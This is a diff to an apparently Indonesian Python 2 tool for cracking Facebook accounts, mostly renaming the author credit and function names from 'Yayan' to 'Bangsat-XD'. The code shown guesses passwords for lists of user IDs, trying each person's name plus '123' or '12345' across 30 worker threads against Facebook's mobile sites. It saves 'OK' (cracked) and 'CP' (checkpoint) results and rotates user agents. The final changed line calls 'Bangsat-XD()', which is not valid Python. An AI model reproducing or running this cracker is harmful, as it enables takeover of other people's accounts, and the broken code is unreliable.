@@ -5,7 +5,7 @@
 
 #      (C) Copyright 407 Authentic Exploit
 #      Rebuild Copyright Can't make u real programmer:)
-#      Coded By Yayan XD.
+#      Coded By Bangsat-XD.
 
 import os
 try:
@@ -520,7 +520,7 @@ def info_tools():
     print '\n %s[%s>%s] Fanspage : https://www.facebook.com/GARANGAN.KECHE'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s>%s] Instagram: https://www.instagram.com/raka_andrian27'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
-    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));bangsat_xd()
 
 ### ganti user agent
 def seting_yntkts():
@@ -547,7 +547,7 @@ def yo_ndak_tau_ko_tanya_saia():
     try:
         open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
         jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
-        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));bangsat_xd()
     except:pass
 
 # Cek User Agent
@@ -643,7 +643,7 @@ class __crack__:
             print ' [%s3%s]. method mobile (super slow)'%(O,N)
             self.__pler__()
         else:
-            print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);moch_yayan()
+            print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);bangsat_xd()
         return
 
     def __api__(self, user, __yan__):
@@ -811,7 +811,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with RakaGanteng(max_workers=30) as (__yayanXD__):
+            with RakaGanteng(max_workers=30) as (__bangsatXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
@@ -830,7 +830,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__bangsatXD__):
+            with RakaGanteng(max_workers=30) as (__bangsatXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
@@ -839,7 +839,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
+                        __bangsatXD__.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
 
@@ -858,7 +858,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__mfb__, uid, pwx)
+                        __bangsatXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
 
@@ -870,4 +870,4 @@ class __crack__:
 
 if __name__ == '__main__':
     os.system('git pull')
-    Bangsat_XD()
+    Bangsat-XD()
